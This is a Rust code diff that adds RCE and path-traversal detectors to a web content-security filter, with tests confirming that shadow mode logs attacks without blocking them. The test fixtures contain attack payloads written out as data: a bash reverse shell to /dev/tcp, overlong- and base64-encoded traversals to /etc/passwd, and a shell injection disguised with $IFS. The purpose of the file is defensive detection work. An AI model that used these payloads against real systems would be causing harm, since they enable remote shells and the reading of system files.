@@ -48,7 +48,7 @@ use crate::checks::{Check, DirTraversalCheck, RceCheck, SqlInjectionCheck, XssCh
 pub use budget::{Budget, ContentInspectionState};
 pub use canary::{BreakerState, CircuitBreaker, canary_bucket, in_canary};
 pub use config::{Dialect, EnforcementMode, RuntimeContentSecurityConfig};
-pub use detectors::StructuralSqlDetector;
+pub use detectors::{RceStructuralDetector, StructuralSqlDetector, TraversalStructuralDetector};
 pub use preprocess::{PreprocessCtx, SemanticDetector, View, semantic_preprocessor};
 pub use scoring::{RuntimeAttackConfig, RuntimeScoringConfig, score};
 pub use types::{
@@ -121,12 +121,17 @@ impl ContentSecuritySubsystem {
         ];
         let now = Instant::now();
         let breaker = Mutex::new(CircuitBreaker::new(config.breaker, now));
-        // Production Lane 2 detectors (P1b): the structural SQLi detector. It only
-        // contributes to scoring when the SQLi family is enabled + weighted in the
-        // compiled config; with the lane off (`config.enabled == false`)
-        // `evaluate_scoped` short-circuits before any detector runs, so the
-        // zero-config install still does zero Lane 2 work.
-        let detectors: Vec<Box<dyn SemanticDetector>> = vec![Box::new(detectors::StructuralSqlDetector::new())];
+        // Production Lane 2 detectors: the structural SQLi detector (P1b) plus the
+        // RCE (shell command injection) and Traversal T1 (encoded path traversal)
+        // detectors (P1c). Each only contributes to scoring when ITS attack family
+        // is enabled + weighted in the compiled config; with the lane off
+        // (`config.enabled == false`) `evaluate_scoped` short-circuits before any
+        // detector runs, so the zero-config install still does zero Lane 2 work.
+        let detectors: Vec<Box<dyn SemanticDetector>> = vec![
+            Box::new(detectors::StructuralSqlDetector::new()),
+            Box::new(detectors::RceStructuralDetector::new()),
+            Box::new(detectors::TraversalStructuralDetector::new()),
+        ];
         Self {
             legacy_checkers,
             config,
@@ -681,6 +686,240 @@ mod tests {
             sub.resolve_action(verdict.recommendation),
             SemanticAction::Log,
             "shadow (log_only) must downgrade a genuine Block to Log (real downgrade, not sub-threshold)"
+        );
+    }
+
+    // ── P1c: RCE + Traversal detectors fire but shadow never blocks ───────────
+
+    /// Enabled `log_only` (shadow) runtime config with a single-detector family.
+    fn single_family_log_only_rt(family: &str, detector: &str) -> RuntimeContentSecurityConfig {
+        let mut weights = BTreeMap::new();
+        weights.insert(detector.to_string(), 1.0);
+        let mut attacks = BTreeMap::new();
+        attacks.insert(
+            family.to_string(),
+            SemanticAttackConfig {
+                enabled: true,
+                weights,
+                log_threshold: 40,
+                block_threshold: 80,
+                hard_veto_allowlist: Vec::new(),
+            },
+        );
+        let cfg = ContentSecurityConfig {
+            enabled: true,
+            enforcement_mode: "log_only".to_string(),
+            attacks,
+            ..ContentSecurityConfig::default()
+        };
+        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
+    }
+
+    #[test]
+    fn real_rce_detector_fires_but_shadow_never_blocks() {
+        // The production RceStructuralDetector fires on a reverse shell (conf 92 ≥
+        // block threshold 80) so the scorer recommends EXACTLY Block — yet the
+        // default log_only posture downgrades the effective action to Log. Lane 1
+        // would veto this raw payload first, so we drive the Lane 2 pipeline
+        // directly (as the SQLi shadow test does).
+        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("rce", "rce"));
+        let det = RceStructuralDetector::new();
+        let req = ctx();
+        let pctx = PreprocessCtx {
+            scope: InspectionScope::Body,
+            req: &req,
+        };
+        let view = View {
+            location: Cow::Borrowed("body"),
+            round: 0,
+            text: Cow::Borrowed("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            lower_trunc: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string(),
+            provenance: Provenance::Raw,
+        };
+        let mut st = ContentInspectionState::default();
+        let finding = det
+            .detect(&view, &pctx, &mut st)
+            .expect("rce must fire on reverse shell");
+        assert_eq!(finding.rule_key, "rce.reverse_shell");
+        assert_eq!(finding.attack, AttackKind::Rce);
+        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
+        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
+        assert_eq!(
+            verdict.recommendation,
+            SemanticAction::Block,
+            "confidence 92 (weight 1.0) reaches the block threshold (80)"
+        );
+        assert_eq!(
+            sub.resolve_action(verdict.recommendation),
+            SemanticAction::Log,
+            "shadow (log_only) downgrades a genuine RCE Block to Log"
+        );
+    }
+
+    #[test]
+    fn real_traversal_detector_fires_but_shadow_never_blocks() {
+        // The Traversal T1 detector fires on an overlong-encoded traversal (conf
+        // 82 ≥ block threshold 80) → scorer recommends Block → shadow → Log.
+        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
+        let det = TraversalStructuralDetector::new();
+        let req = ctx();
+        let pctx = PreprocessCtx {
+            scope: InspectionScope::Body,
+            req: &req,
+        };
+        let view = View {
+            location: Cow::Borrowed("body"),
+            round: 1,
+            text: Cow::Borrowed("..%c0%af..%c0%afetc/passwd"),
+            lower_trunc: "..%c0%af..%c0%afetc/passwd".to_string(),
+            provenance: Provenance::UrlDecoded,
+        };
+        let mut st = ContentInspectionState::default();
+        let finding = det
+            .detect(&view, &pctx, &mut st)
+            .expect("traversal must fire on overlong");
+        assert_eq!(finding.rule_key, "traversal.overlong");
+        assert_eq!(finding.attack, AttackKind::Traversal);
+        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
+        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
+        assert_eq!(
+            verdict.recommendation,
+            SemanticAction::Block,
+            "confidence 82 (weight 1.0) reaches the block threshold (80)"
+        );
+        assert_eq!(
+            sub.resolve_action(verdict.recommendation),
+            SemanticAction::Log,
+            "shadow (log_only) downgrades a genuine Traversal Block to Log"
+        );
+    }
+
+    #[test]
+    fn lane1_clean_shell_normalised_rce_fires_through_production_pipeline() {
+        // codex A-2/A-3/A-4 acceptance: a quote/`$IFS`-split `python3 -c id` that
+        // Lane 1's URL-decode-only path never reveals. Driven through the REAL
+        // `evaluate_scoped` (preprocess → detector → score), it must (a) leave Lane
+        // 1 clean (→ Semantic, not LegacyVeto) and (b) produce an RCE signal on a
+        // BlindDecoded (shell-normalised) view — a default-on rule the OLD gate
+        // dropped. Shadow resolves the Block recommendation to Log.
+        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("rce", "rce"));
+        let mut req = ctx();
+        req.body_preview = Bytes::from_static(b"cmd=pyth''on3$IFS-c$IFSid");
+        req.content_length = req.body_preview.len() as u64;
+        let mut st = ContentInspectionState::default();
+        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
+            ContentVerdict::Semantic(v) => v,
+            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
+        };
+        let sig = verdict
+            .signals
+            .iter()
+            .find(|s| s.attack == AttackKind::Rce)
+            .expect("the shell-normalised view must produce an RCE signal");
+        assert_eq!(
+            sig.provenance,
+            Provenance::BlindDecoded,
+            "the RCE signal came through shell normalisation (blind, never hard-veto)"
+        );
+        assert!(
+            sig.rule_key.starts_with("rce."),
+            "a real RCE rule_key: {}",
+            sig.rule_key
+        );
+        assert_eq!(
+            verdict.recommendation,
+            SemanticAction::Block,
+            "python -c (confidence 82) reaches the block threshold (80)"
+        );
+        assert_eq!(
+            sub.resolve_action(verdict.recommendation),
+            SemanticAction::Log,
+            "shadow (log_only) downgrades the genuine RCE Block to Log"
+        );
+    }
+
+    #[test]
+    fn lane1_clean_base64_traversal_fires_through_production_pipeline() {
+        // codex A-2 acceptance: a base64-wrapped `../../../etc/passwd` — invisible
+        // to Lane 1 (it never decodes base64) — surfaces a Traversal T1 signal on a
+        // BlindDecoded view through the production pipeline, and shadow keeps it
+        // advisory (Log).
+        use base64::Engine as _;
+        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
+        let payload = base64::engine::general_purpose::STANDARD.encode("../../../etc/passwd");
+        let mut req = ctx();
+        req.body_preview = Bytes::from(format!("file={payload}"));
+        req.content_length = req.body_preview.len() as u64;
+        let mut st = ContentInspectionState::default();
+        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
+            ContentVerdict::Semantic(v) => v,
+            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
+        };
+        let sig = verdict
+            .signals
+            .iter()
+            .find(|s| s.attack == AttackKind::Traversal)
+            .expect("the base64 blind decode must produce a Traversal signal");
+        assert_eq!(
+            sig.provenance,
+            Provenance::BlindDecoded,
+            "the Traversal signal came through base64 blind decode"
+        );
+        assert!(
+            sig.rule_key.starts_with("traversal."),
+            "a real Traversal rule_key: {}",
+            sig.rule_key
+        );
+        // sensitive_abs (68) ≥ log threshold (40), below block (80) → Log.
+        assert_eq!(verdict.recommendation, SemanticAction::Log);
+        assert_eq!(
+            sub.resolve_action(verdict.recommendation),
+            SemanticAction::Log,
+            "shadow keeps the traversal advisory"
+        );
+    }
+
+    #[test]
+    fn lane1_clean_base64_fully_double_encoded_traversal_fires_through_production_pipeline() {
+        // codex A-4 must-fix acceptance: a base64-wrapped FULLY double-encoded
+        // traversal (`%252e%252e%252fetc%252fpasswd` — every byte, including the
+        // separator, double-percent-encoded) must still clear the shared blind
+        // gate and fire `traversal.encoded_dotdot` once the separator set is
+        // corrected to accept `%252f`/`%255c`. Before the fix this literal (no
+        // raw `/etc/passwd`, no single-encoded separator) would have been
+        // invisible: the gate only recognised a further encoded *dot* as a valid
+        // continuation, never the fully double-encoded separator itself.
+        use base64::Engine as _;
+        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
+        let payload = base64::engine::general_purpose::STANDARD.encode("%252e%252e%252fetc%252fpasswd");
+        let mut req = ctx();
+        req.body_preview = Bytes::from(format!("file={payload}"));
+        req.content_length = req.body_preview.len() as u64;
+        let mut st = ContentInspectionState::default();
+        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
+            ContentVerdict::Semantic(v) => v,
+            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
+        };
+        let sig = verdict
+            .signals
+            .iter()
+            .find(|s| s.attack == AttackKind::Traversal)
+            .expect("the fully double-encoded traversal must clear the blind gate and fire");
+        assert_eq!(
+            sig.provenance,
+            Provenance::BlindDecoded,
+            "the Traversal signal came through base64 blind decode"
+        );
+        assert_eq!(
+            sig.rule_key, "traversal.encoded_dotdot",
+            "must fire the corrected encoded_dotdot rule, not sensitive_abs (no raw /etc/passwd appears)"
+        );
+        // encoded_dotdot (75) ≥ log threshold (40), below block (80) → Log.
+        assert_eq!(verdict.recommendation, SemanticAction::Log);
+        assert_eq!(
+            sub.resolve_action(verdict.recommendation),
+            SemanticAction::Log,
+            "shadow keeps the fully double-encoded traversal advisory (not blocked)"
         );
     }
 
